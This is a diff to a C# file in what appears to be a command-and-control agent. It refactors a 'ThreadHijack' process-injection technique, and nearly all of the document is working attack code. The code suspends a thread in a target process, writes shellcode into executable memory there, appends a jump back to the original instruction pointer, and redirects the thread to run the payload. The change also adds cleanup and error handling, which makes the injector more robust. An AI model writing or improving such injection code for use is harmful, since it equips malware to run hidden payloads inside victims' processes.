@@ -6,8 +6,25 @@ using Microsoft.Win32.SafeHandles;
 
 namespace Agent
 {
-    internal class ThreadHijack : ITechnique
+    public interface IThreadHijackNative
     {
+        IntPtr OpenThread(ThreadHijack.ThreadAccess access, bool inherit, uint threadId);
+        uint SuspendThread(IntPtr thread);
+        bool GetThreadContext(IntPtr thread, ref ThreadHijack.CONTEXT64 context);
+        IntPtr OpenProcess(int access, bool inherit, int processId);
+        IntPtr VirtualAllocEx(IntPtr process, IntPtr address, uint size, uint allocationType, uint protection);
+        bool VirtualFreeEx(IntPtr process, IntPtr address, uint size, uint freeType);
+        bool WriteProcessMemory(IntPtr process, IntPtr address, byte[] bytes, uint size, out UIntPtr bytesWritten);
+        bool SetThreadContext(IntPtr thread, ref ThreadHijack.CONTEXT64 context);
+        int ResumeThread(IntPtr thread);
+        bool CloseHandle(IntPtr handle);
+    }
+
+    public sealed class ThreadHijack : ITechnique
+    {
+        private readonly IThreadHijackNative native;
+        public ThreadHijack() : this(new WindowsThreadHijackNative()) { }
+        public ThreadHijack(IThreadHijackNative native) => this.native = native;
         int ITechnique.id => 3;
         async Task<bool> ITechnique.Inject(ISpawner spawner, SpawnOptions spawnOptions, byte[] shellcode)
         {
@@ -16,87 +33,89 @@ namespace Agent
                 return false;
             }
             SafeProcessHandle hProc;
-            if (!spawner.TryGetHandle(spawnOptions.task_id, out hProc))
+            if (!spawner.TryGetHandle(spawnOptions.task_id, out hProc) ||
+                hProc is null ||
+                hProc.IsInvalid)
             {
                 return false;
             }
 
-            Process process = Process.GetProcessById(ProcessIdFromHandle(hProc.DangerousGetHandle()));
+            var processIdResolver = new ProcessHandleResolver(new ProcessHandleNative());
+            int processId = processIdResolver.Resolve(hProc.DangerousGetHandle());
+            using Process process = Process.GetProcessById(processId);
 
-            return Run(process.Threads, shellcode, process.Id);
-        }
-        private static int ProcessIdFromHandle(IntPtr processHandle)
-        {
-            Process process = Process.GetProcessById((int)processHandle);
-            return process.Id;
+            if (process.Threads.Count == 0) return false;
+            return InjectThread((uint)process.Threads[0].Id, process.Id, shellcode);
         }
 
-        private bool Run(ProcessThreadCollection threads, byte[] payload, int process_id)
+        public bool InjectThread(uint threadId, int processId, byte[] payload)
         {
-            // Open and Suspend first thread
-            ProcessThread pT = threads[0];
-            Console.WriteLine("ThreadId: " + pT.Id);
-            IntPtr pOpenThread = OpenThread(ThreadAccess.THREAD_HIJACK, false, (uint)pT.Id);
-            SuspendThread(pOpenThread);
-
-            // Get thread context
-            CONTEXT64 tContext = new CONTEXT64();
-            tContext.ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL;
-            if (GetThreadContext(pOpenThread, ref tContext))
+            IntPtr thread = native.OpenThread(ThreadAccess.THREAD_HIJACK, false, threadId);
+            if (thread == IntPtr.Zero || thread == new IntPtr(-1)) return false;
+            IntPtr process = IntPtr.Zero;
+            IntPtr remote = IntPtr.Zero;
+            bool suspended = false;
+            bool contextPointsToRemote = false;
+            int resumeAttempts = 0;
+            try
             {
-                Console.WriteLine("CurrentEip    : {0}", tContext.Rip);
+                if (native.SuspendThread(thread) == uint.MaxValue) return false;
+                suspended = true;
+                var context = new CONTEXT64 { ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL };
+                if (!native.GetThreadContext(thread, ref context)) return false;
+                CONTEXT64 originalContext = context;
+
+                byte[] shellcode = new byte[payload.Length + 12];
+                payload.CopyTo(shellcode, 0);
+                new byte[] { 0x48, 0xb8 }.CopyTo(shellcode, payload.Length);
+                BitConverter.GetBytes(context.Rip).CopyTo(shellcode, payload.Length + 2);
+                new byte[] { 0xff, 0xe0 }.CopyTo(shellcode, payload.Length + 10);
+
+                process = native.OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, processId);
+                if (process == IntPtr.Zero || process == new IntPtr(-1)) return false;
+                remote = native.VirtualAllocEx(process, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                if (remote == IntPtr.Zero) return false;
+                if (!native.WriteProcessMemory(process, remote, shellcode, (uint)shellcode.Length, out UIntPtr written) || written.ToUInt64() != (ulong)shellcode.Length)
+                    return false;
+                context.Rip = (ulong)remote.ToInt64();
+                if (!native.SetThreadContext(thread, ref context)) return false;
+                contextPointsToRemote = true;
+                resumeAttempts++;
+                if (native.ResumeThread(thread) < 0)
+                {
+                    if (native.SetThreadContext(thread, ref originalContext))
+                        contextPointsToRemote = false;
+                    return false;
+                }
+                suspended = false;
+                return true;
             }
-
-            // Once shellcode has executed return to thread original EIP address (mov to rax then jmp to address)
-            byte[] mov_rax = new byte[2] {
-            0x48, 0xb8
-        };
-            byte[] jmp_address = BitConverter.GetBytes(tContext.Rip);
-            byte[] jmp_rax = new byte[2] {
-            0xff, 0xe0
-        };
-
-            // Build shellcode
-            byte[] shellcode = new byte[payload.Length + mov_rax.Length + jmp_address.Length + jmp_rax.Length];
-            payload.CopyTo(shellcode, 0);
-            mov_rax.CopyTo(shellcode, payload.Length);
-            jmp_address.CopyTo(shellcode, payload.Length + mov_rax.Length);
-            jmp_rax.CopyTo(shellcode, payload.Length + mov_rax.Length + jmp_address.Length);
-
-            // OpenProcess to allocate memory
-            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, process_id);
-
-            // Allocate memory for shellcode within process
-            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((shellcode.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-
-            // Write shellcode within process
-            // Need to update this to be ReadWrite and then ReadExecute
-            UIntPtr bytesWritten;
-            bool resp1 = WriteProcessMemory(procHandle, allocMemAddress, shellcode, (uint)((shellcode.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
-
-            // Read memory to view shellcode
-            int bytesRead = 0;
-            byte[] buffer = new byte[shellcode.Length];
-            ReadProcessMemory(procHandle, allocMemAddress, buffer, buffer.Length, ref bytesRead);
-            Console.WriteLine("Data in memory: " + System.Text.Encoding.UTF8.GetString(buffer));
-
-            // Set context EIP to location of shellcode
-            tContext.Rip = (ulong)allocMemAddress.ToInt64();
-
-            // Apply new context to suspended thread
-            if (!SetThreadContext(pOpenThread, ref tContext))
+            finally
             {
-                Console.WriteLine("Error setting context");
+                if (remote != IntPtr.Zero && !contextPointsToRemote)
+                    native.VirtualFreeEx(process, remote, 0, MEM_RELEASE);
+                while (suspended && resumeAttempts < MAX_RESUME_ATTEMPTS)
+                {
+                    resumeAttempts++;
+                    if (native.ResumeThread(thread) >= 0) suspended = false;
+                }
+                if (process != IntPtr.Zero) native.CloseHandle(process);
+                native.CloseHandle(thread);
             }
-            if (GetThreadContext(pOpenThread, ref tContext))
-            {
-                Console.WriteLine("ShellcodeAddress: " + allocMemAddress);
-                Console.WriteLine("NewEip          : {0}", tContext.Rip);
-            }
-            // Resume the thread, redirecting execution to shellcode, then back to original process
-            Console.WriteLine("Redirecting execution!");
-            ResumeThread(pOpenThread);
-            return true;
+        }
+
+        private sealed class WindowsThreadHijackNative : IThreadHijackNative
+        {
+            public IntPtr OpenThread(ThreadAccess access, bool inherit, uint id) => ThreadHijack.OpenThread(access, inherit, id);
+            public uint SuspendThread(IntPtr thread) => ThreadHijack.SuspendThread(thread);
+            public bool GetThreadContext(IntPtr thread, ref CONTEXT64 context) => ThreadHijack.GetThreadContext(thread, ref context);
+            public IntPtr OpenProcess(int access, bool inherit, int id) => ThreadHijack.OpenProcess(access, inherit, id);
+            public IntPtr VirtualAllocEx(IntPtr process, IntPtr address, uint size, uint allocation, uint protection) => ThreadHijack.VirtualAllocEx(process, address, size, allocation, protection);
+            public bool VirtualFreeEx(IntPtr process, IntPtr address, uint size, uint freeType) => ThreadHijack.VirtualFreeEx(process, address, size, freeType);
+            public bool WriteProcessMemory(IntPtr process, IntPtr address, byte[] bytes, uint size, out UIntPtr written) => ThreadHijack.WriteProcessMemory(process, address, bytes, size, out written);
+            public bool SetThreadContext(IntPtr thread, ref CONTEXT64 context) => ThreadHijack.SetThreadContext(thread, ref context);
+            public int ResumeThread(IntPtr thread) => ThreadHijack.ResumeThread(thread);
+            public bool CloseHandle(IntPtr handle) => ThreadHijack.CloseHandle(handle);
         }
         // Import API Functions 
         [DllImport("kernel32.dll")]
@@ -126,6 +145,9 @@ namespace Agent
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint dwFreeType);
+
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
 
@@ -143,6 +165,8 @@ namespace Agent
         // Memory permissions
         const uint MEM_COMMIT = 0x00001000;
         const uint MEM_RESERVE = 0x00002000;
+        const uint MEM_RELEASE = 0x00008000;
+        const int MAX_RESUME_ATTEMPTS = 3;
         const uint PAGE_READWRITE = 4;
         const uint PAGE_EXECUTE_READWRITE = 0x40;
 
